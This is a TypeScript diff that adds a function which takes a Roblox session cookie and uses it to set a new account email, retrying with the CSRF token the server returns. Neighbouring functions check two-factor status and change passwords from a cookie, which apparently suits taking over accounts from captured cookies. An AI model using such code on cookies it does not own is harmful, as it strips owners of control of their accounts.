@@ -331,6 +331,52 @@ export async function checkTwoFactorStatus(cookie: string, userId: string): Prom
   return { enabled: false, mediaType: null };
 }
 
+export async function addPendingEmail(cookie: string, newEmail: string, password: string): Promise<{ success: boolean; error?: string }> {
+  try {
+    const session = await (async () => {
+      const jar = new CookieJar();
+      await jar.setCookie(`.ROBLOSECURITY=${cookie.trim()}; Domain=.roblox.com; Path=/`, 'https://accountsettings.roblox.com');
+      return wrapper(axios.create({ jar }));
+    })();
+
+    const baseHeaders = {
+      'Content-Type': 'application/json',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+    };
+
+    const url = 'https://accountsettings.roblox.com/v1/email';
+    const payload = { email: newEmail, password };
+
+    let resp = await session.post(url, payload, {
+      headers: baseHeaders,
+      validateStatus: () => true,
+      timeout: AXIOS_TIMEOUT,
+    });
+
+    if (resp.status === 403 && resp.headers['x-csrf-token']) {
+      const csrf = resp.headers['x-csrf-token'];
+      resp = await session.post(url, payload, {
+        headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrf },
+        validateStatus: () => true,
+        timeout: AXIOS_TIMEOUT,
+      });
+    }
+
+    if (resp.status === 200) {
+      return { success: true };
+    }
+
+    let errorMsg = `HTTP ${resp.status}`;
+    try {
+      const json = resp.data;
+      if (json && json.message) errorMsg = json.message;
+    } catch {}
+    return { success: false, error: errorMsg };
+  } catch (err: any) {
+    return { success: false, error: err.message };
+  }
+}
+
 export async function changePassword(
   cookie: string,
   currentPassword: string,
